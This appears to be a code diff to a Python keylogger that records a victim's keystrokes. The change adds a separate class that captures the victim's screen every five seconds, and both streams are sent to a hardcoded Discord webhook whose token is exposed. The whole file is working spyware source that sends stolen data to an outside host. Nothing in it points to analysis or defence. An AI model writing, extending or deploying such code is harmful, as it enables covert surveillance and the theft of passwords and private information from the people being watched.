@@ -7,7 +7,8 @@ import PIL.ImageGrab
 from io import BytesIO
 
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1212496091015159809/NglEdKo1KOnsdgBURtnjOc5uYf7Bch8VShuCceECKLtJK7TbWsvhWTzi0oofaLysuezz'  # Your Discord Webhook URL
-TIME_INTERVAL = 10 # Amount of time between each report, expressed in seconds.
+MESSAGE_INTERVAL = 10  # Amount of time between each report, expressed in seconds.
+IMAGE_INTERVAL = 5  # Amount of time between each screenshot, expressed in seconds.
 COMPUTER_NAME = os.getenv("USERNAME") # victim pc name
 
 char_list = ["a", "ą", "b", "c", "ć", "d", "e", "ę", "f", "g", "h", "i", "j", "k", "l", "m", "n", "ń", "o", "ó", "p", "q", "r", "s", "ś", "t", "u", "v", "w", "x", "y", "z", "ż","ź", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]
@@ -62,14 +63,35 @@ replace_list = [
     {"char": "Key.media_play_pause", "replace": " [MEDIA PLAY/PAUSE] "},
 ]
 
-class Keylogger:
+class ImageSender: 
+    def __init__(self, webhook_url, interval, computer_name):
+        self.webhook = Webhook(webhook_url)
+        self.interval = interval
+        self.computer_name = computer_name
+
+    def _send_image(self):
+        image = PIL.ImageGrab.grab()
+        bytes = BytesIO()
+        image.save(bytes, format="PNG")
+        bytes.seek(0)
+        dfile = File(bytes, name="victim_screen.png")
+
+        date = str(datetime.datetime.now())[0:16]
+
+        embed = Embed(description=f'New screenshot from {self.computer_name} [ {date} ]', color=0x5CDBF0, title=f'New Screenshot ({self.interval} seconds interval)')
+        self.webhook.send(embed=embed, file=dfile)
+        Timer(self.interval, self._send_image).start()
+    
+    def _start(self):
+        self._send_image()
+
+class KeyLogger:
     def __init__(self, webhook_url, interval, computer_name):
         self.interval = interval
         self.computer_name = computer_name
         self.webhook = Webhook(webhook_url)
         self.log = ""
     def _report(self):
-        im = PIL.ImageGrab.grab()
         if len(self.log) > 0:
             for i in replace_list:
                 self.log = self.log.replace(i["char"], i["replace"])
@@ -78,17 +100,10 @@ class Keylogger:
                 self.log = self.log[1:]
 
             date = str(datetime.datetime.now())[0:16]
-
-            bytes = BytesIO()
-
-            im.save(bytes, format="PNG")
-            bytes.seek(0)
-            dfile = File(bytes, name="victim_screen.png")
-            
             
             embed_message = Embed(description=f'[ {date} ] ( {self.computer_name} ) : {str(self.log)}', color=0x5CDBF0, title='Keylogger Message')
             
-            self.webhook.send(embed=embed_message, file=dfile)
+            self.webhook.send(embed=embed_message)
             self.log = ''
             print('Sent', self.log)
         else :
@@ -107,5 +122,5 @@ class Keylogger:
             t.join()
 
 if __name__ == '__main__':
-    print('Keylogger started')
-    Keylogger(WEBHOOK_URL, TIME_INTERVAL, COMPUTER_NAME).run()
+    ImageSender(WEBHOOK_URL, IMAGE_INTERVAL, COMPUTER_NAME)._start()
+    KeyLogger(WEBHOOK_URL, MESSAGE_INTERVAL, COMPUTER_NAME).run()
